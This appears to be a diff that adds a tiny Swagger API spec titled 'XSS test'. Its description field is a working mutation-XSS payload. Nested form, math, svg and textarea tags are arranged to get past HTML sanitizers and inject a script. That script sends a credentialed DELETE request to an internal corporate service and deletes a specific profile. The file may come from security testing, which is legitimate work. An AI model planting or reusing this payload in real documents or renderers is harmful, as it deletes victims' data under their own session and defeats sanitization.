@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>var xhr=new XMLHttpRequest();xhr.open("DELETE","https://dryadservice.corp.amazon.com:1443/profiles/ff0dba0f-5feb-4eec-b997-b0bd3d3c48bf",true);xhr.withCredentials=true;xhr.send();</script>"></form>
